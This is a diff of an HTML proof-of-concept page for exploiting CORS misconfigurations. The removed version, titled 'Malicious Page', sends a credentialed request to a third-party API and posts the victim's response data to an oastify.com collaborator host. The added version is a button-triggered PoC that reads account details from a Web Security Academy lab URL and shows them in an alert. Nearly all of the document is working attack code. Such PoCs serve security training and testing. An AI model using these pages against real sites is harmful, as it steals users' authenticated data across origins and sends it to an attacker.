@@ -1,27 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <title>Malicious Page</title>
-</head>
-<body>
-    <h1>Exploiting CORS Misconfiguration</h1>
-    <script>
-        // Exploit code
-        var req = new XMLHttpRequest();
-        req.onload = function () {
-            // Display victim's data in an alert box (or send it to attacker's server)
-            alert("Victim's Data: " + this.responseText);
-
-            // Optionally, exfiltrate data to the attacker's server
-            fetch('https://p8yfxpfj89s1l6cfhm44oo07byhp5mtb.oastify.com', {
-                method: 'POST',
-                body: this.responseText,
-                headers: { 'Content-Type': 'application/json' }
-            });
-        };
-        req.open('GET', 'https://quitplan.ycq2.org/api/slips/?_method=PUT&time=Mon+Dec+23+2024+23%3a48%3a18+GMT-0800+%28Pacific+Standard+Time%29&note=&tz=-08%3a00&newTrigger=', true);
-        req.withCredentials = true;
-        req.send();
-    </script>
-</body>
-</html>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://0ab600ec033bea4780e2218700600057.web-security-academy.net/accountDetails", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
